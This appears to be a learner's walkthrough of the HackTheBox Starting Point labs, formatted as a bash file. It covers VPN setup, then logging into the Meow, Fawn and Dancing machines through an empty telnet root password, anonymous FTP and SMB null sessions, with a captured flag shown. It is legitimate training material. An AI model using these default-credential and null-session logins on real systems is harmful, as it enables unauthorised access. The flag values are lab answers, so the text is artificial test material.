#!/bin/bash

# HACKTHEBOX (HTB)
  HackTheBox is an online training platform for legally practising and learning with vulnerable virtual machines and completing real-world scenarios.
STEP 1: Download VPN Config from HTB
STEP 2: Connect to HTB VPN
 SYNTAX- 'sudo openvpn ~/Downloads/your_username.ovpn'
  Keep this terminal open - VPN drops if this terminal is closed.
  Open a NEW terminal for all other commands.
STEP 3: Verify connection
 SYNTAX- 'ip addr show tun0'
  Your tun0 interface shows a 10.10.x.x address. This is your HTB tunnel IP.
  All reverse shells from HTB machines connect back to THIS IP.
STEP 4: Spawn the machine from HTB website
 'hackthebox.com -> Labs -> Starting Point -> "Jerry" -> Spawn Machine'
 HTB gives you an IP: 10.10.10.95 (Jerry's IP may vary)
STEP 5: Verify you can reach the machine
 SYNTAX- 'ping -c 2 10.10.10.95'
  64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=45ms
  ttl=127 => decremented from 128 : Windows machine
  ttl=63  => decremented from 64  : Linux machine
  This gives you the OS before even running Nmap.
STEP 6: # Create a working directory for this machine
 SYNTAX- 'mkdir -p ~/htb/jerry && cd ~/htb/jerry'
 SYNTAX- ~/htb/jerry$ 'export TARGET=10.10.10.95
  Store target IP as variable so you don't mistype it

# HTB Starting Point
  HTB Starting Point is a series of beginner-friendly machines with guided walkthroughs.
# Starting Point Machines
MACHINE 1: MEOW (Telnet + empty root password)
 ~/htb/meow$ 'nmap -sV $TARGET'
  23/tcp open telnet Linux telnetd
 ~/htb/meow$ 'telnet $TARGET'
  Meow login: root
  Password: (press Enter - no password)
 root@Meow:~# 'cat flag.txt'
  b40abdfe23665f766f9c61ecba8a4c19 <- Submit this on HTB
 "Lesson: Always try default/empty credentials first. Check telnet ports"
MACHINE 2: FAWN (FTP anonymous login)
 ~/htb/fawn$ 'nmap -sV $TARGET'
  21/tcp open ftp vsftpd 3.0.3
 ~/htb/fawn$ 'ftp $TARGET'
  Name: anonymous
  Password: (press Enter)
  230 Login successful.
 ftp> 'ls'
  flag.txt
 ftp> 'get flag.txt'
 "Lesson: FTP anonymous login is a common real-world misconfiguration"
MACHINE 3: DANCING (SMB null session)
 ~/htb/dancing$ 'nmap -sV $TARGET'
  445/tcp open microsoft-ds Windows 10 microsoft-ds
 ~/htb/dancing$ 'smbclient -L //$TARGET -N'
  Sharename Type Comment
  WorkShares Disk
 ~/htb/dancing$ 'smbclient //$TARGET/WorkShares -N'
 smb: \> 'ls'
 smb: \> 'cd James.P\'
 smb: \James.P\> 'get flag.txt'
 "Lesson: SMB null sessions (no authentication) expose network shares"
